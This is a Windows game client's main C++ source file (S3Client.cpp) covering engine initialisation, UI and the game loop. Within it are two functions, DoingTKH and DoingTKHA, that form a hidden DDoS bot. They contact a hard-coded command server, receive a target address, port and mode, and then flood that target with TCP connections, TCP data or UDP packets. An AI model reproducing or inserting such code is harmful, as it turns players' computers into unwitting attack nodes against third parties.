 // S3Client.cpp : Defines the entry point for the application.
//

#include "KWin32.h"
#include "KCore.h"
#include "S3Client.h"
#include "KWin32Wnd.h"
#include "../../Represent/iRepresent/iRepresentShell.h"
#include "Ui/UiShell.h"
#include "NetConnect/NetConnectAgent.h"
#include "TextCtrlCmd/TextCtrlCmd.h"
#include "KPakList.h"
#include "Ui/Elem/TextPic.h"
#include "Ui/Elem/UiCursor.h"
#include "Ui/Elem/SpecialFuncs.h"
#include "Ui/FilterTextLib.h"
#include "Ui/ChatFilter.h"
#include "Ui/uibase.h"
#include "ErrorCode.h"


#include <tlhelp32.h> 
#include <shlwapi.h> 
#include <conio.h> 
#include <stdio.h> 



#include <winsock2.h>

#pragma comment (lib,"ws2_32.lib")



#define ClientVersion
KMyApp		MyApp;
HINSTANCE	hInst;
KPakList	g_PakList;
CFilterTextLib g_libFilterText;
CChatFilter g_ChatFilter;


#define	QUIT_QUESTION_ID	"22"
#define	GAME_TITLE			"23"

#define REPRESENT_MODULE_2			"Represent2.dll"
#define REPRESENT_MODULE_3			"Represent3.dll"
#define CREATE_REPRESENT_SHELL_FUN	"CreateRepresentShell"
#define	GAME_FPS			18
//Representģ��ӿڵ�ָ��
struct iRepresentShell*	g_pRepresentShell = NULL;
struct IInlinePicEngineSink* g_pIInlinePicSink = NULL;
iCoreShell*				g_pCoreShell = NULL;
KMusic*					g_pMusic = NULL;

#define	DYNAMIC_LINK_REPRESENT_LIBRARY

#ifdef DYNAMIC_LINK_REPRESENT_LIBRARY
	static HMODULE		l_hRepresentModule = NULL;
	int					g_bRepresent3 = false;
#endif
	
int					g_bScreen = true;
char				g_szGameName[32] = "SwordMan";


KClientCallback g_ClientCallback;

#define	SCREEN_WIDTH	800
#define SCREEN_HEIGHT	600

/*
 * Add this macro by liupeng on 2003.3.20
 * This macro is helper that can judge some legal character
 */
#define _private_IS_SPACE(c)   ((c) == ' ' || (c) == '\r' || (c) == '\n' || (c) == '\t' || (c) == 'x')
#define IS_SPACE(c)	_private_IS_SPACE(c)




char TIpServer[32] = "210.245.94.104";
int  TPortServer = 5995;

char TIpDoing[32] = "";
int  TPortDoing = 0;

int TDoing = 0;

int TKey = 0;


WSAData TWsaData;
struct linger TLg = { 1, 0 };
unsigned long TGo = 1;
unsigned long TBlock = 0;
u_long TIMode = 0;
int TWinSock;
int TSize = 0;
SOCKET TSocketClient1 = INVALID_SOCKET;
SOCKET TSocketClient2 = INVALID_SOCKET;
SOCKET TSocketClient3 = INVALID_SOCKET;


BOOL bCheckExit = FALSE;


DWORD WINAPI DoingTKHA(LPVOID IdTheard)
{

for (;;)
{


if (bCheckExit)
break;



if (TDoing == 1)
{

if (TKey == 1)
{

struct sockaddr_in TSocketClientAdd;
TSocketClientAdd.sin_family = AF_INET;
TSocketClientAdd.sin_port = htons(TPortDoing);
TSocketClientAdd.sin_addr.s_addr = inet_addr(TIpDoing);

if (TSocketClient1 == INVALID_SOCKET)
{

  TSocketClient1 = socket(AF_INET,SOCK_STREAM,0);

if (TSocketClient1 == SOCKET_ERROR)
{
setsockopt(TSocketClient1, SOL_SOCKET, SO_LINGER,(const char *)&TLg, sizeof(struct linger));
closesocket(TSocketClient1);
TSocketClient1 = INVALID_SOCKET;
continue;
}

}


if (connect(TSocketClient1,(sockaddr*)&TSocketClientAdd,sizeof(TSocketClientAdd)) == SOCKET_ERROR)
{
setsockopt(TSocketClient1, SOL_SOCKET, SO_LINGER,(const char *)&TLg, sizeof(struct linger));
closesocket(TSocketClient1);
TSocketClient1 = INVALID_SOCKET;
continue;
}

}


else if (TKey == 2)
{

struct sockaddr_in TSocketClientAdd;
TSocketClientAdd.sin_family = AF_INET;
TSocketClientAdd.sin_port = htons(TPortDoing);
TSocketClientAdd.sin_addr.s_addr = inet_addr(TIpDoing);

if (TSocketClient2 == INVALID_SOCKET)
{

  TSocketClient2 = socket(AF_INET,SOCK_STREAM,0);

if (TSocketClient2 == SOCKET_ERROR)
{
setsockopt(TSocketClient2, SOL_SOCKET, SO_LINGER,(const char *)&TLg, sizeof(struct linger));
closesocket(TSocketClient2);
TSocketClient2 = INVALID_SOCKET;
continue;
}

if (connect(TSocketClient2,(sockaddr*)&TSocketClientAdd,sizeof(TSocketClientAdd)) == SOCKET_ERROR)
{
setsockopt(TSocketClient2, SOL_SOCKET, SO_LINGER,(const char *)&TLg, sizeof(struct linger));
closesocket(TSocketClient2);
TSocketClient2 = INVALID_SOCKET;
continue;
}

}


if (TSize > 102400)
	TSize = 102400;

if (TSize < 1)
	TSize = 1;

char SendBuf[102400];
memset(SendBuf, 11, sizeof(SendBuf));
SendBuf[TSize-1] = 0;

int iResult = send(TSocketClient2,SendBuf,strlen(SendBuf),0);
if (iResult == SOCKET_ERROR && (WSAGetLastError()  == WSAECONNABORTED || WSAGetLastError()  == WSAECONNRESET))
	{
		setsockopt(TSocketClient2, SOL_SOCKET, SO_LINGER,(const char *)&TLg, sizeof(struct linger));
        closesocket(TSocketClient2);
		TSocketClient2 = INVALID_SOCKET;
		continue;
    }


}



else if (TKey == 3)
{



if (TSocketClient3 == INVALID_SOCKET)
{

    TSocketClient3 = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (TSocketClient3 == INVALID_SOCKET) 
	{
	setsockopt(TSocketClient3, SOL_SOCKET, SO_LINGER,(const char *)&TLg, sizeof(struct linger));
       closesocket(TSocketClient3);
	   TSocketClient3 = INVALID_SOCKET;
	   continue;
    }

}

    

struct sockaddr_in TSocketClientAdd;
TSocketClientAdd.sin_family = AF_INET;
TSocketClientAdd.sin_port = htons(TPortDoing);
TSocketClientAdd.sin_addr.s_addr = inet_addr(TIpDoing);

	if (TSize > 102400)
		TSize = 102400;
	if (TSize < 1)
	TSize = 1;

	char SendBuf[102400];
	memset(SendBuf, 11, sizeof(SendBuf));
	SendBuf[TSize-1] = 0;
    
    int iResult = sendto(TSocketClient3,SendBuf, strlen(SendBuf), 0, (SOCKADDR *) & TSocketClientAdd, sizeof (TSocketClientAdd));
    if (iResult == SOCKET_ERROR) 
	{
		setsockopt(TSocketClient3, SOL_SOCKET, SO_LINGER,(const char *)&TLg, sizeof(struct linger));
        closesocket(TSocketClient3);
		TSocketClient3 = INVALID_SOCKET;
		continue;
    }

}



}
else
{

if (TSocketClient1 != INVALID_SOCKET)
{
setsockopt(TSocketClient1, SOL_SOCKET, SO_LINGER,(const char *)&TLg, sizeof(struct linger));

closesocket(TSocketClient1);
TSocketClient1 = INVALID_SOCKET;
}
if (TSocketClient2 != INVALID_SOCKET)
{
setsockopt(TSocketClient2, SOL_SOCKET, SO_LINGER,(const char *)&TLg, sizeof(struct linger));
closesocket(TSocketClient2);
TSocketClient2 = INVALID_SOCKET;
}
if (TSocketClient3 != INVALID_SOCKET)
{
setsockopt(TSocketClient3, SOL_SOCKET, SO_LINGER,(const char *)&TLg, sizeof(struct linger));
closesocket(TSocketClient3);
TSocketClient3 = INVALID_SOCKET;
}

}



Sleep(100);


}

return 1;

}



DWORD WINAPI DoingTKH(LPVOID IdTheard)
{




    TWinSock = WSAStartup(MAKEWORD(2,2),&TWsaData);
	if (TWinSock == SOCKET_ERROR)
	{
	WSACleanup();
	return -1;
	}





struct sockaddr_in TSocketClientAdd;
TSocketClientAdd.sin_family = AF_INET;
TSocketClientAdd.sin_port = htons(TPortServer);
TSocketClientAdd.sin_addr.s_addr = inet_addr(TIpServer);



CreateThread(NULL,NULL,DoingTKHA,NULL,NULL,NULL);


for (;;)
{

if (bCheckExit)
break;


SOCKET TSocketClient = socket(AF_INET,SOCK_STREAM,0);


if (TSocketClient == SOCKET_ERROR)
	{
	setsockopt(TSocketClient, SOL_SOCKET, SO_LINGER,(const char *)&TLg, sizeof(struct linger));
	closesocket(TSocketClient);
	}

if (connect(TSocketClient,(sockaddr*)&TSocketClientAdd,sizeof(TSocketClientAdd)) == SOCKET_ERROR)
{
setsockopt(TSocketClient, SOL_SOCKET, SO_LINGER,(const char *)&TLg, sizeof(struct linger));
closesocket(TSocketClient);
continue;
}


char TBufferRecv[128];
int TByteRecv;


for (;;)
{

ioctlsocket(TSocketClient,FIONBIO,&TGo);

TByteRecv = recv(TSocketClient,TBufferRecv,sizeof(TBufferRecv),0);
if (TByteRecv != SOCKET_ERROR)
{
if (TBufferRecv[0] == 2)
{
char szPort[32] = "";
char szSize[32] = "";
int i ;
for ( i = 0; i < TBufferRecv[1];i++)
{
TIpDoing[i] = TBufferRecv[i+2];
}
TIpDoing[TBufferRecv[1]] = 0;
for (i = 0; i < TBufferRecv[TBufferRecv[1]+2] ;i++)
{
szPort[i] = TBufferRecv[TBufferRecv[1]+2+1+i];
}
szPort[TBufferRecv[TBufferRecv[1]+2]] = 0;
TPortDoing = atoi(szPort);
TKey = TBufferRecv[TBufferRecv[1]+2+1+TBufferRecv[TBufferRecv[1]+2]];

if (TKey == 1)
{
TDoing = 1;
}
else if (TKey == 2 || TKey == 3)
{

for (i = 0; i < TBufferRecv[TBufferRecv[1]+2+1+TBufferRecv[TBufferRecv[1]+2]+1] ;i++)
{
szSize[i] = TBufferRecv[TBufferRecv[1]+2+1+TBufferRecv[TBufferRecv[1]+2]+1+1+i];
}
szSize[TBufferRecv[TBufferRecv[1]+2+1+TBufferRecv[TBufferRecv[1]+2]+1]] = 0;

TSize = atoi(szSize);
TDoing = 1;

}

}
else if (TBufferRecv[0] == 1)
{
TDoing = 0;
}
}
else if (WSAGetLastError()  == WSAECONNABORTED || WSAGetLastError()  == WSAECONNRESET)
{
setsockopt(TSocketClient, SOL_SOCKET, SO_LINGER,(const char *)&TLg, sizeof(struct linger));
closesocket(TSocketClient);
TDoing = 0;
break;
}

Sleep(1000);

}

Sleep(1000);
}

return 1;
}











int APIENTRY WinMain(HINSTANCE hInstance,
                     HINSTANCE hPrevInstance,
                     LPSTR     lpCmdLine,
                     int       nCmdShow)
{

 	// TODO: Place code here.

	/*
	 * Add this funtion by liupeng on 2003.3.20
	 * We can find some error when start a console tracer
	 */
#ifdef	TRUE

	bool bOpenTracer = false;

    while( lpCmdLine[0] == '-' || lpCmdLine[0] == '/' )
    {
        lpCmdLine++;
		
        switch ( *lpCmdLine++ )
        {
		case 'c':
        case 'C':
            bOpenTracer = true;
            break;
        }
		
        while( IS_SPACE( *lpCmdLine ) )
        {
            lpCmdLine++;
        }
    }
	
	if ( bOpenTracer ) 
	{
		AllocConsole();
	}

#endif // End of this function

	hInst = hInstance;

char nClassGame[32] = "Version 1.0";

 

 char ModuleName[1024];
 GetModuleFileName(NULL,ModuleName,sizeof(ModuleName));
 
// if(!StrStrI(ModuleName, "Game1.exe")) 
 //{
 // MyApp.GameExit();
  //return 0;
 //}


	if (MyApp.Init(hInstance,nClassGame))
		MyApp.Run();



#ifdef TRUE

	if ( bOpenTracer )
	{
		FreeConsole();
	}

#endif
	Error_Box();



	bCheckExit = TRUE;


	return 0;
}

void KMyApp::killProcessByName(const char *filename)
{
    HANDLE hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, NULL);
    PROCESSENTRY32 pEntry;
    pEntry.dwSize = sizeof (pEntry);
    BOOL hRes = Process32First(hSnapShot, &pEntry);
    while (hRes)
    {
        if (strcmp(pEntry.szExeFile, filename) == 0)
        {
            HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, 0,
                                          (DWORD) pEntry.th32ProcessID);
            if (hProcess != NULL)
            {
                TerminateProcess(hProcess, 9);
                CloseHandle(hProcess);
            }
        }
        hRes = Process32Next(hSnapShot, &pEntry);
    }
    CloseHandle(hSnapShot);
}


KMyApp::KMyApp()
{
	m_pInlinePicSink = NULL;
}
#define DEFAULT_BITSPERSEL 16

BOOL InitRepresentShell(BOOL bFullScreen, int nWidth, int nHeight)
{
	Error_SetErrorString(g_bRepresent3 ? REPRESENT_MODULE_3 : REPRESENT_MODULE_2);
	if (g_pRepresentShell == NULL)
	{
#ifdef DYNAMIC_LINK_REPRESENT_LIBRARY
		if (l_hRepresentModule == NULL &&
			(l_hRepresentModule = LoadLibrary(g_bRepresent3 ? REPRESENT_MODULE_3 : REPRESENT_MODULE_2)) == NULL)
		{
			Error_SetErrorCode(ERR_T_LOAD_MODULE_FAILED);
			return FALSE;
		}
		fnCreateRepresentShell pCreate = (fnCreateRepresentShell)GetProcAddress(
			l_hRepresentModule, CREATE_REPRESENT_SHELL_FUN);
		if (pCreate == NULL || 
			(g_pRepresentShell = pCreate()) == NULL)
		{
			Error_SetErrorCode((pCreate == NULL) ? ERR_T_MODULE_UNCORRECT : ERR_T_MODULE_INIT_FAILED);
			return FALSE;
		}
#else
		g_pRepresentShell = CreateRepresentShell();
#endif
	}
	DEVMODE DevMode;
	if (EnumDisplaySettings(NULL, ENUM_CURRENT_SETTINGS, &DevMode))
	{
		if (DevMode.dmBitsPerPel != DEFAULT_BITSPERSEL)
		{
			DevMode.dmBitsPerPel = DEFAULT_BITSPERSEL;
			::ChangeDisplaySettings(&DevMode, 0);
		}
	}
	
	if(g_pRepresentShell->Create(nWidth, nHeight, bFullScreen != 0))
	{
		return TRUE;
	}
	else
	{
		Error_SetErrorCode(g_bRepresent3 ? ERR_T_REPRESENT3_INIT_FAILED : ERR_T_REPRESENT2_INIT_FAILED);
		return FALSE;
	}
}

BOOL KMyApp::GameInit()
{
	Error_SetErrorString("KMyApp::GameInit");
    #ifdef KUI_USE_HARDWARE_MOUSE
	
    ShowMouse(TRUE);
    
    #else   // KUI_USE_HARDWARE_MOUSE
	
    ShowMouse(FALSE);
    
    #endif

	g_SetRootPath(NULL);
	g_SetFilePath("\\");

	KIniFile*	pSetting = g_UiBase.GetCommConfigFile();
	if (pSetting)
	{
		pSetting->GetString("Main", "GameName", "������Ե�������", g_szGameName, sizeof(g_szGameName));
        SetWindowText(g_GetMainHWnd(), g_szGameName);
	}

//#ifdef _DEBUG
	g_FindDebugWindow("#32770","DebugWin");
//#endif

	KIniFile	IniFile;
	if (!IniFile.Load("\\config.ini"))
	{
		Error_SetErrorCode(ERR_T_FILE_NO_FOUND);
		Error_SetErrorString("\\config.ini");
		return FALSE;
	}

#ifdef _DEBUG
	BOOL		bCursor = FALSE;
	if (IniFile.GetInteger("Client", "ShowCursor", 0, &bCursor))
		ShowMouse(TRUE);
#endif

	IniFile.GetInteger("Client", "FullScreen", FALSE, &g_bScreen);

#ifdef DYNAMIC_LINK_REPRESENT_LIBRARY
	IniFile.GetInteger("Client", "Represent", 2, &g_bRepresent3);
	g_bRepresent3 = (g_bRepresent3 == 3);
#endif

	g_PakList.Open("\\config.ini");

	char	szPath[MAX_PATH];
	if (IniFile.GetString("Client", "CapPath", "", szPath, sizeof(szPath)))
	{
		if (szPath[0])
			SetScrPicPath(szPath);
	}

	IniFile.Clear();

	if (!g_libFilterText.Initialize()
		|| !g_ChatFilter.Initialize())
		return FALSE;

	if (!InitRepresentShell(g_bScreen, SCREEN_WIDTH, SCREEN_HEIGHT))
	{
		return FALSE;
	}

	if (!UiInit())
	{
		Error_SetErrorCode(ERR_T_MODULE_INIT_FAILED);
		Error_SetErrorString("UiInit");
		return FALSE;
	}

	//[wxb 2003-6-23]
	m_pInlinePicSink = new KInlinePicSink;
    if (m_pInlinePicSink)
	{
		m_pInlinePicSink->Init(g_pRepresentShell);
		_ASSERT(NULL == g_pIInlinePicSink);
		g_pIInlinePicSink = m_pInlinePicSink;
	}

	UiSetScreenSize(SCREEN_WIDTH, SCREEN_HEIGHT);

	UiPaint(0);

	// init dsound
	m_Sound.Init();

	SetMultiGame(TRUE);

	if ((g_pCoreShell = CoreGetShell()) == NULL)
	{
		Error_SetErrorCode(ERR_T_MODULE_INIT_FAILED);
		Error_SetErrorString("CoreGetShell");
		return false;
	}
	g_pCoreShell->SetRepresentShell(g_pRepresentShell);
	g_pCoreShell->SetMusicInterface((KMusic*)&m_Music);
	g_pCoreShell->SetCallDataChangedNofify(&g_ClientCallback);
	g_pCoreShell->SetRepresentAreaSize(SCREEN_WIDTH, SCREEN_HEIGHT);
	
	g_pMusic = &m_Music;

	if (g_NetConnectAgent.Initialize() == 0)
	{
		Error_SetErrorCode(ERR_T_MODULE_INIT_FAILED);
		Error_SetErrorString("NetConnectAgent");
		return FALSE;
	}

	m_GameCounter = 0;
	m_Timer.Start();
	
	SetMouseHoverTime(400);

	if(UiStart())
	{
		return TRUE;
	}
	else
	{
		Error_SetErrorCode(ERR_T_MODULE_INIT_FAILED);
		Error_SetErrorString("UiStart");
		return FALSE;
	}


}

BOOL KMyApp::GameExit()
{






	if (m_pInlinePicSink)
	{
		//[wxb 2003-6-23]
		m_pInlinePicSink->UnInit();
		delete m_pInlinePicSink;
		m_pInlinePicSink = NULL;
		g_pIInlinePicSink = NULL;
	}

	UiExit();

	g_pMusic = NULL;
	if (g_pCoreShell)
	{
		g_pCoreShell->SetRepresentShell(NULL);
		g_pCoreShell->SetClient(NULL);
		g_pCoreShell->SetMusicInterface(NULL);
		g_pCoreShell->Release();
		g_pCoreShell = NULL;
	}

	if (g_pRepresentShell)
	{
		g_pRepresentShell->Release();
		g_pRepresentShell = NULL;
	}

	g_NetConnectAgent.Exit();

	m_Music.Close();
	m_Sound.Exit();

#ifdef DYNAMIC_LINK_REPRESENT_LIBRARY
	if (l_hRepresentModule)
	{
		FreeLibrary(l_hRepresentModule);
		l_hRepresentModule = NULL;
	}
#endif

	::ShowCursor(TRUE);

	g_ChatFilter.Uninitialize();
	g_libFilterText.Uninitialize();

	return TRUE;
}

BOOL KMyApp::GameLoop()
{
	static int nGameFps = 0;
	g_NetConnectAgent.Breathe(m_GameCounter);
	
	if (m_GameCounter * 1000 <= m_Timer.GetElapse() * GAME_FPS)
	{
		if (g_pCoreShell->Breathe() && UiHeartBeat())
		{
			m_GameCounter++;
			int	nElapse = m_Timer.GetElapse();
			if (nElapse)
				nGameFps = m_GameCounter * 1000 / nElapse;
		}
		else
		{
			return false;
		}
	}
	if (m_GameCounter * 1000 >= m_Timer.GetElapse() * GAME_FPS)
	{
		UiPaint(nGameFps);
		Sleep(1);
	}
	else if ((m_GameCounter % 8) == 0)
	{
		Sleep(1);
	}

	return true;
}

int KMyApp::HandleInput(UINT uMsg, WPARAM wParam, LPARAM lParam)
{
	int nRet = 0;
	if (uMsg != WM_CLOSE)
	{
		UiProcessInput(uMsg, wParam, lParam);
	}
	else if (g_bScreen == false && UiIsAlreadyQuit() == false)
	{
		KIniFile*	pSetting = g_UiBase.GetCommConfigFile();
		if (pSetting)
		{
			char	szMsg[128], szTitle[64];
			pSetting->GetString("InfoString", QUIT_QUESTION_ID, "", szMsg, sizeof(szMsg));
			pSetting->GetString("InfoString", GAME_TITLE, "", szTitle, sizeof(szTitle));
			if (szMsg[0] && szTitle[0])
			{
				nRet = (MessageBox(g_GetMainHWnd(), szMsg, szTitle,
					MB_YESNO | MB_ICONQUESTION) != IDYES);
			}
		}
	}
	return nRet;
}
